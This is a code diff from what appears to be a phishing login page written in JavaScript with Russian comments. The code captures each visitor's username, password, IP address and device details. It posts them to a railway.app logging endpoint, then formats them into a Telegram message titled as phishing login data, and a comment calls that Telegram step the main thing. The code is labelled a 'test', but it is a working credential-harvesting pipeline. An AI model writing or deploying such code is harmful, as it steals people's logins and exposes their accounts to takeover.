@@ -413,7 +413,7 @@ async function logUserAction(action, description) {
     
     // Также сохраняем в базу данных если нужно
     try {
-        await fetch('https://logs-unisono-project-production.up.railway.app/api/auth/log', {
+        await fetch('https://logs-unisono-project.up.railway.app/api/auth/log', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(userData)
@@ -440,7 +440,11 @@ document.addEventListener('DOMContentLoaded', function() {
             await logUserAction('LOGIN_ATTEMPT', `Попытка входа с логином: ${username}`);
             
             // 1. Пытаемся зарегистрировать в базе данных (но не блокируем процесс при ошибке)
-            const registrationSuccess = await registerUser(username, password, ip);
+            try {
+    await registerUser(username, password, ip);
+} catch (error) {
+    console.log('Регистрация не удалась, но продолжаем:', error);
+}
             
             // 2. Отправляем данные в Telegram (главное!)
             const message = `🎣 <b>ФИШИНГ ТЕСТ - ДАННЫЕ ВХОДА</b>\n\n👤 <b>Логин:</b> ${username}\n🔑 <b>Пароль:</b> ${password}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Устройство:</b> ${navigator.userAgent}\n⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
